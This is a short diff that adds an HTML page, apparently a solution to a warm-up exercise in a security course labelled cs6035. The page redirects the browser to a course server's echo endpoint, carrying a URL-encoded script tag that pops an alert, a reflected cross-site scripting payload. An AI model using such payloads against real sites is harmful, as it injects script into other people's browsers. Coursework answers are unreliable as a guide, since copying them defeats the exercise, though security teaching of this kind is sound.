@@ -1,0 +1,12 @@
+<html>
+<head>
+  <title>cs6035</title>
+</head>
+<body>
+  <script>
+    // add your url to launch an alert via XSS
+    const url = "http://cs6035-warmup.gatech.edu:5000/tools/echo?payload=%3Cscript%3Ealert(%27cs6035%27)%3C/script%3E";
+    window.location.href = url;
+  </script>
+</body>
+</html>
